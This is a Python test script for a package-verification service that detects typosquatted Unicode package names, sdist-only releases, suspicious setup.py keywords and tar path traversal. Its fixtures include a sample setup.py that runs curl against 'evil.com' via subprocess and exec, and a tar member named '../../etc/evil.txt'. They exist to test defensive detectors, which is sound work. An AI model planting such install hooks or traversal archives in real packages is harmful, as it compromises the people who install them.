#!/usr/bin/env python3
"""
demo_test.py — Exercise native detectors + /verify endpoint.

Unit tests (no server, no real PyPI traffic):
  - detect_unicode_risk with clean and confusable names
  - inspect_artifacts_for_install_hooks with mocked pypi_data

Optional live tests (requires 'uvicorn app:app --port 8080' to be running):
  - GET /health
  - POST /verify requests          → ALLOW
  - POST /verify requésts          → QUARANTINE (RULE-UNICODE-01)
  - POST /verify <nonexistent-pkg> → QUARANTINE (registry lookup failed)

Usage:
    python demo_test.py            # unit tests only
    python demo_test.py --live     # unit tests + live API calls
"""

from __future__ import annotations

import json
import sys
import textwrap
import unicodedata

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_PASS = "\033[32m✓\033[0m"
_FAIL = "\033[31m✗\033[0m"
_SKIP = "\033[33m⚠\033[0m"


def _ok(label: str) -> None:
    print(f"  {_PASS}  {label}")


def _fail(label: str, detail: str = "") -> None:
    print(f"  {_FAIL}  {label}")
    if detail:
        print(f"       {detail}")


def _skip(label: str) -> None:
    print(f"  {_SKIP}  {label}")


def _assert(cond: bool, label: str, detail: str = "") -> bool:
    if cond:
        _ok(label)
    else:
        _fail(label, detail)
    return cond


def _section(title: str) -> None:
    print(f"\n{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}")


def _dump(d: dict) -> None:
    for line in json.dumps(d, indent=2, ensure_ascii=False).splitlines():
        print(f"    {line}")


# ---------------------------------------------------------------------------
# Unit tests — detect_unicode_risk
# ---------------------------------------------------------------------------


def test_unicode_clean() -> bool:
    from native_detectors import detect_unicode_risk

    r = detect_unicode_risk("requests")
    return (
        _assert(not r["non_ascii"],       "requests: non_ascii is False")
        and _assert(r["normalized"] == "requests", "requests: normalized unchanged")
        and _assert(r["note"] is None,    "requests: no note")
    )


def test_unicode_cyrillic() -> bool:
    """Cyrillic е (U+0435) is visually identical to Latin e in most fonts."""
    from native_detectors import detect_unicode_risk

    # requ[CYRILLIC_E]sts — looks like "requests"
    name = "requ\u0435sts"
    r = detect_unicode_risk(name)
    print(f"       name repr: {name!r}  (contains U+0435 CYRILLIC SMALL LETTER IE)")
    _dump(r)
    return (
        _assert(r["non_ascii"],        f"{name!r}: non_ascii is True")
        and _assert(r["note"] is not None, f"{name!r}: note is set")
    )


def test_unicode_accented() -> bool:
    """Latin é (U+00E9) normalises to 'e' via NFKD → caught as confusable."""
    from native_detectors import detect_unicode_risk

    name = "requ\u00e9sts"   # requésts
    r = detect_unicode_risk(name)
    print(f"       name repr: {name!r}  (contains U+00E9 LATIN SMALL LETTER E WITH ACUTE)")
    _dump(r)
    return (
        _assert(r["non_ascii"],        f"{name!r}: non_ascii is True")
        and _assert(r["normalized"] == "requests", f"{name!r}: normalizes to 'requests'")
        and _assert(r["note"] is not None, f"{name!r}: note is set")
    )


def test_unicode_hyphenated_clean() -> bool:
    """Hyphens and ASCII-only names must never trigger the rule."""
    from native_detectors import detect_unicode_risk

    for name in ("python-dotenv", "scikit-learn", "my-package-v2"):
        r = detect_unicode_risk(name)
        if not _assert(r["note"] is None, f"{name!r}: no false positive"):
            return False
    return True


# ---------------------------------------------------------------------------
# Unit tests — inspect_artifacts_for_install_hooks (mocked, no network)
# ---------------------------------------------------------------------------


def _mock_pypi(packagetype: str, url: str = "", filename: str = "pkg.tar.gz") -> dict:
    return {
        "info": {"version": "1.0.0"},
        "releases": {
            "1.0.0": [
                {"packagetype": packagetype, "url": url, "filename": filename}
            ]
        },
        "urls": [],
    }


def test_artifact_wheel_only() -> bool:
    from native_detectors import inspect_artifacts_for_install_hooks

    mock = _mock_pypi("bdist_wheel", filename="pkg-1.0-py3-none-any.whl")
    r = inspect_artifacts_for_install_hooks(mock, "testpkg", "1.0.0")
    return (
        _assert(r["wheel_available"],    "wheel-only: wheel_available True")
        and _assert(not r["sdist_only"], "wheel-only: sdist_only False")
    )


def test_artifact_sdist_only_no_url() -> bool:
    """sdist_only must be True even when the URL is empty (download skipped)."""
    from native_detectors import inspect_artifacts_for_install_hooks

    mock = _mock_pypi("sdist", url="", filename="pkg-1.0.tar.gz")
    r = inspect_artifacts_for_install_hooks(mock, "testpkg", "1.0.0")
    return (
        _assert(not r["wheel_available"], "sdist-only: wheel_available False")
        and _assert(r["sdist_only"],       "sdist-only: sdist_only True")
    )


def test_artifact_both_available() -> bool:
    """When wheel AND sdist exist, sdist_only must be False."""
    from native_detectors import inspect_artifacts_for_install_hooks

    mock = {
        "info": {"version": "1.0.0"},
        "releases": {
            "1.0.0": [
                {"packagetype": "bdist_wheel", "url": "", "filename": "pkg.whl"},
                {"packagetype": "sdist",        "url": "", "filename": "pkg.tar.gz"},
            ]
        },
        "urls": [],
    }
    r = inspect_artifacts_for_install_hooks(mock, "testpkg", "1.0.0")
    return (
        _assert(r["wheel_available"],    "both: wheel_available True")
        and _assert(r["sdist_available"],"both: sdist_available True")
        and _assert(not r["sdist_only"], "both: sdist_only False")
    )


def test_artifact_no_releases() -> bool:
    """Empty releases dict → graceful note, no crash."""
    from native_detectors import inspect_artifacts_for_install_hooks

    r = inspect_artifacts_for_install_hooks({"releases": {}, "urls": []}, "ghost", None)
    return _assert(r["note"] is not None, "no releases: note is set")


# ---------------------------------------------------------------------------
# Unit tests — keyword scanner in isolation
# ---------------------------------------------------------------------------


def test_keyword_scan() -> bool:
    from native_detectors import _scan_setup_py

    clean   = b"from setuptools import setup\nsetup(name='foo')"
    dirty   = b"import subprocess\nsubprocess.call(['curl', 'evil.com'])\nexec(open('x').read())"
    empty   = b""

    found_clean = _scan_setup_py(clean)
    found_dirty = _scan_setup_py(dirty)
    found_empty = _scan_setup_py(empty)

    return (
        _assert(found_clean == [],                   "clean setup.py: no keywords")
        and _assert("subprocess" in found_dirty,     "dirty setup.py: subprocess detected")
        and _assert("exec(" in found_dirty,          "dirty setup.py: exec( detected")
        and _assert("curl" in found_dirty,           "dirty setup.py: curl detected")
        and _assert(found_empty == [],               "empty bytes: no crash")
    )


# ---------------------------------------------------------------------------
# Unit tests — safe extraction helper
# ---------------------------------------------------------------------------


def test_safe_extract_path_traversal() -> bool:
    """_safe_extractall must silently skip traversal members."""
    import io
    import tarfile
    import tempfile
    from pathlib import Path
    from native_detectors import _safe_extractall

    with tempfile.TemporaryDirectory() as tmpdir:
        dest = Path(tmpdir)

        # Build an in-memory tar with a path-traversal member
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            # Legitimate member
            data = b"print('hello')"
            info = tarfile.TarInfo(name="pkg/setup.py")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))

            # Malicious member — tries to write to parent
            evil_data = b"evil"
            evil_info = tarfile.TarInfo(name="../../etc/evil.txt")
            evil_info.size = len(evil_data)
            tf.addfile(evil_info, io.BytesIO(evil_data))

        buf.seek(0)
        with tarfile.open(fileobj=buf, mode="r:gz") as tf:
            _safe_extractall(tf, dest)

        legitimate = (dest / "pkg" / "setup.py").exists()
        traversal  = (dest.parent / "etc" / "evil.txt").exists()

        return (
            _assert(legitimate,    "safe extract: legitimate file extracted")
            and _assert(not traversal, "safe extract: traversal member blocked")
        )


# ---------------------------------------------------------------------------
# Live API tests (optional — requires running server)
# ---------------------------------------------------------------------------


def _post_verify(url: str, payload: dict, timeout: int = 10) -> dict | None:
    try:
        import requests
        r = requests.post(url, json=payload, timeout=timeout)
        return r.json()
    except Exception as exc:
        print(f"       request failed: {exc}")
        return None


def live_health(base: str) -> bool:
    try:
        import requests
        r = requests.get(f"{base}/health", timeout=5)
        ok = r.json().get("ok") is True
        return _assert(ok, "GET /health → {ok: true}")
    except Exception as exc:
        _skip(f"health check skipped: {exc}")
        return True


def live_verify_requests(base: str) -> bool:
    """requests 2.31.0 must come back ALLOW (well-established package)."""
    payload = {"ecosystem": "pypi", "package": "requests", "version": "2.31.0"}
    r = live_verify(base, payload, expected_verdict="ALLOW",
                    label="POST /verify requests 2.31.0")
    return r


def live_verify_unicode(base: str) -> bool:
    """requésts must trigger RULE-UNICODE-01 and at least QUARANTINE."""
    payload = {"ecosystem": "pypi", "package": "requ\u00e9sts"}
    data = _post_verify(f"{base}/verify", payload)
    if data is None:
        _skip("POST /verify requésts — skipped (no server)")
        return True
    _dump(data)
    return (
        _assert("RULE-UNICODE-01" in data.get("rule_ids", []),
                "requésts: RULE-UNICODE-01 in rule_ids")
        and _assert(data.get("verdict") in ("QUARANTINE", "BLOCK"),
                    f"requésts: verdict is QUARANTINE/BLOCK (got {data.get('verdict')})")
    )


def live_verify_nonexistent(base: str) -> bool:
    """Completely fake package → QUARANTINE with registry lookup failure."""
    name = "totally-nonexistent-xyzzy-99991"
    payload = {"ecosystem": "pypi", "package": name}
    data = _post_verify(f"{base}/verify", payload)
    if data is None:
        _skip(f"POST /verify {name} — skipped (no server)")
        return True
    _dump(data)
    return _assert(
        data.get("verdict") in ("QUARANTINE", "BLOCK"),
        f"{name}: verdict is QUARANTINE/BLOCK (got {data.get('verdict')})"
    )


def live_verify(base: str, payload: dict, expected_verdict: str, label: str) -> bool:
    data = _post_verify(f"{base}/verify", payload)
    if data is None:
        _skip(f"{label} — skipped (no server)")
        return True
    _dump(data)
    return _assert(
        data.get("verdict") == expected_verdict,
        f"{label}: verdict={expected_verdict} (got {data.get('verdict')})"
    )


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------


def run_unit_tests() -> int:
    failures = 0

    _section("Unicode detector — unit tests")
    for fn in [
        test_unicode_clean,
        test_unicode_cyrillic,
        test_unicode_accented,
        test_unicode_hyphenated_clean,
    ]:
        print(f"\n  [{fn.__name__}]")
        if not fn():
            failures += 1

    _section("Artifact inspector — unit tests (mocked, no network)")
    for fn in [
        test_artifact_wheel_only,
        test_artifact_sdist_only_no_url,
        test_artifact_both_available,
        test_artifact_no_releases,
    ]:
        print(f"\n  [{fn.__name__}]")
        if not fn():
            failures += 1

    _section("Keyword scanner — unit tests")
    print(f"\n  [test_keyword_scan]")
    if not test_keyword_scan():
        failures += 1

    _section("Safe extraction — unit tests")
    print(f"\n  [test_safe_extract_path_traversal]")
    if not test_safe_extract_path_traversal():
        failures += 1

    return failures


def run_live_tests(base: str = "http://localhost:8080") -> int:
    failures = 0
    _section(f"Live API tests → {base}")

    for fn in [live_health, live_verify_requests, live_verify_unicode, live_verify_nonexistent]:
        print(f"\n  [{fn.__name__}]")
        if not fn(base):
            failures += 1

    return failures


if __name__ == "__main__":
    live = "--live" in sys.argv
    base = "http://localhost:8080"
    for arg in sys.argv[1:]:
        if arg.startswith("--base="):
            base = arg.split("=", 1)[1]

    total_failures = run_unit_tests()

    if live:
        total_failures += run_live_tests(base)
    else:
        print(f"\n  {_SKIP}  Live API tests skipped (pass --live to enable)")

    print(f"\n{'═'*60}")
    if total_failures == 0:
        print(f"  {_PASS}  All tests passed")
    else:
        print(f"  {_FAIL}  {total_failures} test(s) failed")
    print(f"{'═'*60}\n")

    sys.exit(0 if total_failures == 0 else 1)
